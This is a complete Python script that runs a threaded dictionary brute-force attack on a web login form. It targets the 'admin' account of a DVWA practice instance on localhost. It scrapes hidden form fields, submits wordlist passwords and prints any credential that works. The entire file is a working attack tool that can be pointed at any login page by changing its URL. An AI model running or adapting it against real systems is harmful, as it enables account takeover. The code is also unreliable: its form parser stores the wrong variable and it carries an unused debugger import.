#!/usr/bin/env python3
import threading
import queue
import http.cookiejar
import urllib.request
import urllib.parse
import time
import pdb
from html.parser import HTMLParser

# general variables
threads = 1
username = 'admin'
wordlist_file = 'passwords.lst'
resume = None # password to resume from

# target variables
target_url = 'http://localhost/dvwa/login.php'
target_post = 'http://localhost/dvwa/login.php'

# form variables
username_field = 'username'
password_field = 'password'


class BruteParser(HTMLParser):
	"""get form field"""
	def __init__(self):
		super(BruteParser, self).__init__()
		self.tag_results = dict()

	def handle_starttag(self, tag, attrs):

		if tag == 'input':
			tag_name = None
			tag_value = None

			for name, value in attrs :

				if name == 'name':
					tag_name = value
				if name == 'value':
					tag_value = value

			if tag_name is not None:
				self.tag_results[tag_name] = value

		
class Bruter():
	def __init__(self, username, words):
		self.username = username
		self.passwords_q = words
		self.found = False # Set to True if we found the password

		print("[+] Finished setting up for {} ".format(self.username))

	def run_bruteforce(self):

		for i in range(threads):
			print("[*] Spawning thread {} ...".format(i))
			t = threading.Thread(target=self.web_bruter)
			t.start() 

	def web_bruter(self):

		while not self.passwords_q.empty() and not self.found:
			password_try = self.passwords_q.get()

			# create cookie jar
			cookie_jar = http.cookiejar.FileCookieJar("cookies")

			# handle cookie jar for urllib library
			cookie_handler = urllib.request.HTTPCookieProcessor(cookie_jar)

			# get url respone
			opener = urllib.request.build_opener(cookie_handler)

			response = opener.open(target_url)
			page = response.read()

			print("[*] Trying : {} - {} ( {} left )".format(self.username, password_try, self.passwords_q.qsize()))
			
			# parse html data
			parser = BruteParser()
			parser.feed(page.decode())

			# set our username and password
			post_tags = parser.tag_results
			post_tags[username_field] = self.username
			post_tags[password_field] = password_try

			login_data = urllib.parse.urlencode(post_tags)
			login_response = opener.open(target_post, login_data.encode())

			login_result = login_response.read()

			# if found the password
			if 'Login failed' not in login_result.decode():
				self.found = True
				print("Brute Foce successffull Yeah")
				print("\n[+] Username  : {}".format(self.username))
				print("[+] Password : {}\n".format(password_try))
				print("[*] Waiting for other processes to stop ...")


def build_wordlist(wordlist_file):
	wordlist_queue = queue.Queue()

	with open(wordlist_file, 'r') as f:
		raw_data = f.readlines()

		for word in raw_data:
			wordlist_queue.put(word.rstrip())

	return wordlist_queue

if __name__ == '__main__':

	print('[*] Reading wordlist : {} '.format(wordlist_file))
	passwords_q = build_wordlist(wordlist_file)
	print('[+] Finished reading wordlist successfully ({} passwords)'.format(passwords_q.qsize()))


	bruteforcer = Bruter('admin', passwords_q)
	bruteforcer.run_bruteforce()
